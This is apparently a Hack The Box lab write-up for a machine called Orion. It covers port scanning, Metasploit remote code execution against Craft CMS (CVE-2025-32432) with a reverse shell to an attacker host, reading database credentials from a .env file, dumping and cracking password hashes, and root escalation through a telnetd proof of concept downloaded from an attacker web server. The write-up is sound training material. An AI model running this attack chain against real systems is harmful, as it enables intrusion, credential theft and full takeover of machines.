# Hack The Box — Orion

> **Difficulty:** Easy  
> **OS:** Linux  
> **IP:** `10.129.57.188`  
> **Domain:** `orion.htb`

---

# 1. Initial Recon

## Nmap

I started with a full TCP port scan using default scripts and service/version detection:

```bash
nmap -sC -sV -p- --min-rate 1000 10.129.57.188
```

Results:

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

The HTTP service redirects to:

```text
http://orion.htb/
```

The exposed services are:

- `22/tcp` — SSH
    
- `80/tcp` — HTTP
    

The target is running Ubuntu Linux.

---

## Add the Host to `/etc/hosts`

Since the web server redirects to `orion.htb`, I added the hostname to `/etc/hosts`:

```bash
echo "10.129.57.188 orion.htb" | sudo tee -a /etc/hosts
```

---

# 2. Web Enumeration

I started enumerating the web server using Gobuster:

```bash
gobuster dir -u http://orion.htb \
    -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
```

The scan revealed several interesting endpoints:

```text
/admin       (Status: 302) [--> http://orion.htb/admin/login]
/assets      (Status: 301) [--> http://orion.htb/assets/]
/p1          (Status: 200)
/p2          (Status: 200)
/p3          (Status: 200)
/index       (Status: 200)
/p4          (Status: 200)
/p5          (Status: 200)
/logout      (Status: 302) [--> http://orion.htb/]
/p6          (Status: 200)
/p7          (Status: 200)
/p8          (Status: 200]
```

The most interesting endpoint is:

```text
/admin
```

Navigating to:

```text
http://orion.htb/admin
```

redirects to:

```text
http://orion.htb/admin/login
```

The login page reveals that the application is running:

```text
Craft CMS 5.6.16
```

---

# 3. Craft CMS — CVE-2025-32432

The version of Craft CMS running on the target is vulnerable to:

```text
CVE-2025-32432
```

This vulnerability allows unauthenticated remote code execution against vulnerable Craft CMS installations.

Rather than manually exploiting the vulnerability, I used Metasploit.

Start Metasploit:

```bash
msfconsole
```

Search for Craft CMS modules:

```text
search craft
```

After selecting the appropriate module, I configured the target and callback settings.

For example:

```text
set RHOSTS http://orion.htb/admin
set LHOST <ATTACKER_IP>
```

After executing the module, I received a reverse PHP shell on the target.

At this point, I had remote code execution as the web application user.

---

# 4. Credential Discovery

With access to the target, I started looking through the Craft CMS configuration files.

The application's environment file was particularly interesting:

```text
/craft/.env
```

Reading the file revealed the database configuration:

```text
CRAFT_SECURITY_KEY=RRS86F6i2JQKdC6kfEI7frVxA47WVMx8
CRAFT_DEV_MODE=true
CRAFT_ALLOW_ADMIN_CHANGES=true
CRAFT_DISALLOW_ROBOTS=true

CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=orion
CRAFT_DB_USER=root
CRAFT_DB_SCHEMA=
CRAFT_DB_TABLE_PREFIX=
CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
```

The important information here is that the application connects to MySQL as:

```text
root
```

with the password:

```text
SuperSecureCraft123Pass!
```

---

# 5. Database Enumeration

From the Metasploit session, I spawned a normal shell:

```text
shell
```

I then connected to the local MySQL database:

```bash
mysql -h 127.0.0.1 -P 3306 -u root -p orion
```

Alternatively, I enumerated the database tables with:

```bash
mysql -h 127.0.0.1 -P 3306 -u root -p orion \
  -e "SHOW TABLES;"
```

The `users` table contained the application's user accounts.

I queried the relevant columns:

```bash
mysql -h 127.0.0.1 -P 3306 -u root -p orion \
  -e "SELECT id,username,email,password FROM users;"
```

The result contained:

```text
id  username  email              password
1   admin     adam@orion.htb     2y$13e9zuohgFzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS
```

The password is stored as a hash.

I saved the hash and attempted to crack it using John the Ripper:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt adam.txt
```

After successfully cracking the hash, I obtained valid credentials for the `adam` account.

---

# 6. SSH Access

Since SSH was exposed on port `22`, I used the recovered credentials to authenticate:

```bash
ssh adam@orion.htb
```

Verify the current user:

```bash
whoami
```

```text
adam
```

The user flag is located in Adam's home directory:

```bash
cat /home/adam/user.txt
```

At this point, the initial access portion of the machine is complete.

---

# 7. Privilege Escalation Enumeration

With an SSH shell as `adam`, I began enumerating locally for privilege-escalation opportunities.

One useful command is:

```bash
ss -lntp
```

The output revealed several listening services:

```text
State  Recv-Q Send-Q Local Address:Port       Peer Address:Port
LISTEN 0      10     127.0.0.1:23            0.0.0.0:*
LISTEN 0      128    0.0.0.0:22              0.0.0.0:*
LISTEN 0      511    0.0.0.0:80              0.0.0.0:*
LISTEN 0      4096   127.0.0.53:53           0.0.0.0:*
LISTEN 0      80     127.0.0.1:3306          0.0.0.0:*
LISTEN 0      128    [::]:22                 [::]:*
```

The interesting entry is:

```text
127.0.0.1:23
```

Port `23` is traditionally associated with Telnet.

Because the service is bound to `127.0.0.1`, it was not directly accessible from my attacking machine. However, since I already had a shell on the target, I could interact with it locally.

---

# 8. Identifying the Telnet Version

I checked the installed Telnet version:

```bash
telnet --version
```

The target returned:

```text
telnet (GNU inetutils) 2.7
```

The version was interesting because it is affected by:

```text
CVE-2026-24061
```

This vulnerability affects GNU Inetutils `telnetd` and can be leveraged for privilege escalation under the appropriate conditions.

---

# 9. CVE-2026-24061

I used a public proof of concept for:

```text
CVE-2026-24061
```

The PoC used for the machine was:

```text
CVE-2026-24061-POC
```

I transferred the exploit to the target using a temporary Python HTTP server.

On my attacking machine:

```bash
python3 -m http.server 8000
```

From the SSH session on the target:

```bash
wget http://10.10.14.175:8000/cve_2026_24061_telnetd.py
```

Make the script executable:

```bash
chmod +x cve_2026_24061_telnetd.py
```

---

# 10. Exploiting Telnetd

The Telnet service is only listening locally:

```text
127.0.0.1:23
```

Therefore, I executed the exploit directly from the SSH session:

```bash
./cve_2026_24061_telnetd.py 127.0.0.1 23
```

The exploit successfully abused the vulnerable Telnet service and resulted in a root shell.

I verified my privileges with:

```bash
id
```

The result showed:

```text
uid=0(root) gid=0(root)
```

I now had full root access to the machine.

---

# 11. Root Flag

With root access, the root flag can be retrieved with:

```bash
cat /root/root.txt
```

This completes the machine.

---

# 12. Attack Chain

The complete attack path was:

```text
Nmap
  |
  +-- 22/tcp SSH
  |
  +-- 80/tcp HTTP
        |
        +-- /admin
              |
              +-- Craft CMS 5.6.16
                    |
                    +-- CVE-2025-32432
                          |
                          +-- Remote Code Execution
                                |
                                +-- /craft/.env
                                      |
                                      +-- MySQL credentials
                                            |
                                            +-- users table
                                                  |
                                                  +-- admin password hash
                                                        |
                                                        +-- John the Ripper
                                                              |
                                                              +-- Adam credentials
                                                                    |
                                                                    +-- SSH
                                                                          |
                                                                          +-- User flag
                                                                          |
                                                                          +-- ss -lntp
                                                                                |
                                                                                +-- 127.0.0.1:23
                                                                                      |
                                                                                      +-- GNU Telnet 2.7
                                                                                            |
                                                                                            +-- CVE-2026-24061
                                                                                                  |
                                                                                                  +-- root
                                                                                                        |
                                                                                                        +-- Root flag
```

---

# 13. Vulnerabilities

|Vulnerability|Impact|
|---|---|
|Craft CMS 5.6.16 / CVE-2025-32432|Remote code execution|
|Sensitive credentials in `.env`|Database access|
|Password hash exposed in database|Credential recovery|
|GNU Inetutils Telnet 2.7 / CVE-2026-24061|Local privilege escalation|
|Telnet bound to localhost|Not externally exposed, but accessible after initial compromise|

---

# 14. Key Takeaways

- Always perform full port scans rather than relying only on the common ports.
    
- Pay attention to HTTP redirects because they often reveal the expected hostname.
    
- Enumerate administrative interfaces such as `/admin`.
    
- Identify the exact version of web applications before attempting exploitation.
    
- Application configuration files such as `.env` files can contain highly sensitive credentials.
    
- Once database credentials are discovered, enumerate the database for additional users and password hashes.
    
- Password hashes can sometimes be cracked offline using tools such as John the Ripper.
    
- After obtaining SSH access, enumerate locally rather than focusing only on externally exposed services.
    
- `ss -lntp` is useful for identifying services that are only bound to localhost.
    
- A service that is not externally accessible can still become an important privilege-escalation vector after obtaining local access.
    
- Always check the versions of locally running services when looking for privilege-escalation opportunities.
    
- Keeping system packages and services patched is critical, especially for vulnerabilities that allow local privilege escalation.
    

---

# Flags

```text
User:
cat /home/adam/user.txt

Root:
cat /root/root.txt
```